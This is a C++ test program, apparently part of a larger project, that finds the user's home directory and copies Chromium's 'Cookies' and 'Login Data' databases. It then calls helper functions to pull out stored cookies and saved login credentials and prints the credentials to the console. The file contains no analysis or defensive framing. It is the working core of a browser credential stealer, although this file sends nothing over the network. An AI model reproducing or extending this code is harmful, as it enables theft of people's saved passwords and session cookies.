/*
    Compilation:
        # Compilare l'object file di "sqlite3.c" per successivamente linkarlo:
                gcc sqlite3.c -c
        # Compilare il file linkando "sqlite3.o" e specificando il path d'inclusione per "sqlite3.h":
                g++ test_chromium.cpp sqlite3.o -I/sqlite3.h Chromium/Chromium.cpp SQLite/SQLite.cpp -pthread -ldl

                    Dove "-I/sqlite3.h" e`il percorso al file "sqlite3.h"
*/
#include <stdio.h>
#include <iostream>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <pwd.h>
#include "../Chromium/Chromium.h"
#include "../SQLite/SQLite.h"

//#define _DEBUG

// Linux chromium Login Data path       =>      /home/z3r0/.config/chromium/Default/Login Data

const char * get_home_path(){
    const char *home = std::getenv("HOME");
    if(home == NULL){
        struct passwd *pw = getpwuid(getuid());
        home = pw->pw_dir;
    }
    return home;
}

int main(){

    std::string basePath = get_home_path();
    basePath.append("/.config/chromium/Default/");

    std::string cookiesPath = basePath;     // Invoca automaticamente il costruttore di copia se non ricordo male (oppure il costruttore con string come parametro?).
    cookiesPath.append("Cookies");
    std::cout << "cookiesPath == " << cookiesPath << std::endl;
    SQLite::copy_db(cookiesPath.c_str(), "cookies_db");
    sqlite3 *dbCookies = SQLite::get_db_handler("cookies_db");
    std::stringstream cookies = Chromium::get_cookies(dbCookies);
#ifdef _DEBUG
    std::cout << cookies.str() << std::endl;
#endif


    std::string credentialsPath = basePath;
    credentialsPath.append("Login Data");
    std::cout << "credentialsPath == " << credentialsPath << std::endl;
    SQLite::copy_db(credentialsPath.c_str(), "credentials");
    sqlite3 *dbCredentials = SQLite::get_db_handler("credentials");
    std::stringstream credentials = Chromium::get_credentials(dbCredentials);
//#ifdef _DEBUG
    std::cout << credentials.str() << std::endl;
//#endif


    sqlite3_close(dbCredentials);
}